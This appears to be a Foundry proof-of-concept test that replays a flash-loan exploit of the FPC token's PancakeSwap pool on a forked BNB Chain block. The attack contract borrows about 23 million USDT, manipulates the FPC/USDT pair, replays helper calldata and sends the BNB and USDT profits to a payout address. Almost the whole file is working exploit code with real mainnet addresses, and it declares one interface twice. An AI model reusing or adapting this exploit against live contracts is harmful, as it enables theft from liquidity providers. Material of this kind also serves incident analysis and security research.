
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 52624700;
    uint256 constant TX_TIMESTAMP = 1751466319;
    uint256 constant TX_BLOCK_NUMBER = 52624701;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.A_421FA2_6FE2, address(0), Addresses.ZERO, "BNB", 731533618044520680054);
        _expectProfit(Addresses.A_421FA2_6FE2, address(0), Addresses.USDT, "USDT", 4171581527140201011205321);
        _expectProfit(Addresses.attack_contract, attack, Addresses.FPC, "FPC", 542737799722769701862543);
    }
}

contract OurAttack {





    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_92B780_3121);
        {
            bytes memory flashProof =
                abi.encode(Addresses.FPC, Addresses.Cake_LP_ED6B, uint256(23020000000000000000000000));
            IContract_92B780_3121(Addresses.A_92B780_3121)
                .flash(address(this), 23020000000000000000000000, 0, flashProof);
        }
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 usdtApproveAllowance = 500000000000000000000000;
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, usdtApproveAllowance);
        IPancakeRouter(Addresses.PancakeRouter).WETH();
        {
            if (500000000000000000000000 != 0) {
                IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, 500000000000000000000000);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForETH(
                        500000000000000000000000,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.WBNB),
                        address(this),
                        1751466319
                    );
            }
        }
        {
            (bool ok,) = payable(Addresses.A_1266C6_5F20).call{value: 5000000000000000000}("");
            if (!ok)
            {  }
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 731533618044520680054) nativeTransferAmount = 731533618044520680054;
            (bool ok,) = payable(Addresses.A_421FA2_6FE2).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.A_421FA2_6FE2, usdtBalanceOfAttackAttackContract);
    }

    function _callback() internal {
        _markCallback(1);
        uint256 usdtBalanceOfAttackAttackContract = IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_ED6B, usdtBalanceOfAttackAttackContract);
    }

    function flashCallback() internal {
        _markCallback(2);
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(23019990000000000000000000, _addressArray2(Addresses.USDT, Addresses.FPC));
        IUniswapV2PairLike(Addresses.Cake_LP_ED6B)
            .swap(1000000000000000000, 790178970489172772916652, address(this), hex"00");
        uint256 fpcBalanceOfAttackAttackContract = IERC20Like(Addresses.FPC).balanceOf(address(this));
        IERC20Like(Addresses.FPC).balanceOf(Addresses.Cake_LP_ED6B);
        uint256 transferLiveAmount = 247441170766403071054109;
        IERC20Like(Addresses.FPC).transfer(Addresses.A_C2A819_B456, transferLiveAmount);
        {
            bytes memory replayCallData =
                hex"c07a5a3500000000000000000000000010ed43c718714eb63d5aa57b78b54704e256024e000000000000000000000000b192d4a737430aa61cea4ce9bfb6432f7d42592f";
            (bool ok,) = Addresses.A_C2A819_B456.call(replayCallData);
            require(ok, "replay selector 0xc07a5a35 failed");
        }
        uint256 transferLiveAmount_2 = 23022302000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.A_92B780_3121, transferLiveAmount_2);
    }

    function _attack2() internal {
        _markCallback(3);
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x1921e20f) {
            _attack();
            return;
        }
        if (msg.sig == 0x84800812) {
            _callback();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_1266C6_5F20 = 0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant attacker_eoa = 0x18dD258631b23777c101440380bf053C79db3d9d;
    address internal constant A_421FA2_6FE2 = 0x421Fa2F1fE768d9F7C95be7949BEE96d3E3d6FE2;
    address internal constant A_463C07_F62A = 0x463C07457b3571d96423De8B6cDF81a25640f62A;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_92B780_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant Cake_LP_ED6B = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;
    address internal constant FPC = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attack_contract = 0xbf6e706D505E81AD1F73BbC0BABfE2B414Ba3Eb3;
    address internal constant A_C2A819_B456 = 0xC2a81942627f6929521397eef6173F271D1fB456;
    address internal constant A_CEA188_6D5A = 0xCeA188c6bb0dB78Fd17904C03e28F43AE4e46d5a;
}

interface IContract_92B780_3121 {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function WETH() external view returns (uint256);
    function getAmountsOut(uint256, address[] calldata) external view;
    function swapExactTokensForETH(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}
